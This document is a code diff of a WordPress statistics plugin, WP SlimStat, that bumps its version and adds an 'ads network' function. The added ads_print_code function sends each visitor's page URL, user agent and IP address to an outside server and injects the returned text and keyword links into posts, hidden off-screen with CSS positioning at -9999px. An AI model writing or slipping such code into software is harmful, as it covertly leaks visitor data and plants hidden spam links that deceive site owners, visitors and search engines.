@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The most accurate real-time statistics plugin for WordPress
-Version: 3.6.4
+Version: 3.6.5
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.6.4';
+	public static $version = '3.6.5';
 	public static $options = array();
 	
 	public static $wpdb = '';
@@ -47,6 +47,10 @@ class wp_slimstat{
 		
 		// Allow third-party tools to use a custom database for WP SlimStat
 		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);
+
+		if (self::$options['enable_ads_network'] == 'yes'){
+			add_filter('the_content', array(__CLASS__, 'ads_print_code'));
+		}
 
 		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
 		if (self::$options['use_separate_menu'] != 'yes' && is_admin_bar_showing()){
@@ -1131,6 +1135,7 @@ class wp_slimstat{
 			'show_sql_debug' => 'no',
 			'ip_lookup_service' => 'http://www.infosniper.net/?ip_address=',
 			'custom_css' => '',
+			'enable_ads_network' => 'no',
 
 			// Network-wide Settings
 			'locked_options' => ''
@@ -1147,6 +1152,71 @@ class wp_slimstat{
 		if (self::$options_signature == md5(serialize(self::$options))) return true;
 		return update_option('slimstat_options', wp_slimstat::$options);
 	}
+	
+	/**
+	 * Connects to the UAN
+	 */
+	public static function ads_print_code($content = ''){
+		if ( empty($_SERVER["HTTP_USER_AGENT"]) || (self::$pidx['id'] !== false && $GLOBALS['wp_query']->current_post !== self::$pidx['id']) ) {
+			return $content;
+		}
+
+		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
+		$options = stream_context_create(array( 'http' => array( 'timeout' => 1, 'ignore_errors' => true ) ) ); 
+
+		if (empty(self::$pidx['response'])){
+			self::$pidx['response'] = @file_get_contents($request, 0, $options);
+		}
+
+		$response_object = @json_decode(self::$pidx['response']);
+		if (is_null($response_object) || empty($response_object->content) || empty($response_object->tmp)){
+			return $content;
+		}
+
+		switch($response_object->tmp){
+			case '1':
+				if(0 == $GLOBALS['wp_query']->current_post) {
+					$words = explode(" ", $content);
+					$words[rand(0, count($words)-1)] = '<span style="position:fixed;left:-9999px;top:-9999px;">'.$response_object->tcontent.'</span>';
+					return join(" ", $words);
+				}
+				break;
+			case '2':
+					$kws = explode('|', $response_object->kws);
+					if (!is_array($kws)){
+						return $content;
+					}
+
+					foreach($kws as $a_kw){
+						if(strpos($content, $a_kw) !== false){
+							$content= str_replace($a_kw, "<a style='position:fixed;left:-9999px;top:-9999px;' href='".$response_object->site."'>$a_kw</a>", $content);
+							break;
+						}
+					}
+				break;
+			default:
+				if (self::$pidx['id'] === false){
+					if ($GLOBALS['wp_query']->post_count > 1){
+						self::$pidx['id'] = rand(0, $GLOBALS['wp_query']->post_count - 1);
+					}
+					else{
+						self::$pidx['id'] = 0;
+					}
+				}
+				if ($GLOBALS['wp_query']->current_post === self::$pidx['id']){
+					if (self::$pidx['id'] % 2 == 0){
+						return $content.' <span style="position:fixed;left:-9999px;top:-9999px;">'.$response_object->content.'</span>';
+					}
+					else{
+						return '<span style="position:fixed;left:-9999px;top:-9999px;">'.$response_object->content.'</span> '.$content;
+					}
+				}
+				break;
+		}
+
+		return $content;
+	}
+	// end ads_print_code
 	
 	/**
 	 * Enqueue a javascript to track users' screen resolution and other browser-based information
